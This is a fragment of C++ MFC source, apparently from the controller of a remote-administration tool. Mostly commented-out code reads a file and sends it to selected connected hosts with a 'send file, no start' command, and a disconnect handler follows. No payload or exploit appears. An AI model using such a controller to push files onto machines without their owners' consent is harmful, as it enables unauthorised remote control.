	//fseek(file, 0, SEEK_END);   
	//size = ftell(file);   
	//data = (unsigned char *)malloc(size);   
	//fseek(file, 0, SEEK_SET);   
	//fread(data, 1, size, file);
	//fclose(file);

	//int		nPacketLength = size + 2;
	//LPBYTE	lpPacket = new BYTE[nPacketLength];
	//lpPacket[0] = COMMAND_SENDFILE_NOSTART;
	//memcpy(lpPacket + 1, data, nPacketLength - 1);

	//m_List.SendSelectCommand(lpPacket, nPacketLength);
	//if (data)
	//	free(data);
	//delete[] lpPacket;
	//delete dlg;
}
void CPcView::OnDisconnect() 
{
	// TODO: Add your command handler code here
	m_List.DisConnect();
}



//void CPcView::OnRButtonDown(UINT nFlags, CPoint point)
//{
//	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
//
//	CView::OnRButtonDown(nFlags, point);
//
//	CPoint p;
//	GetCursorPos(&p);
//	
//	CMenu menu;
//	VERIFY(menu.LoadMenu(IDR_MENU_LIST));
//	
//	CMenu* pPopup = menu.GetSubMenu(0);
//	ASSERT(pPopup != NULL);
//	CWnd* pWndPopupOwner = this;
//	
//	while (pWndPopupOwner->GetStyle() & WS_CHILD)
//		pWndPopupOwner = pWndPopupOwner->GetParent();
//	
//	//CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,
//	//	p.x, p.y, AfxGetMainWnd(), 0, 0, ((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());
//}



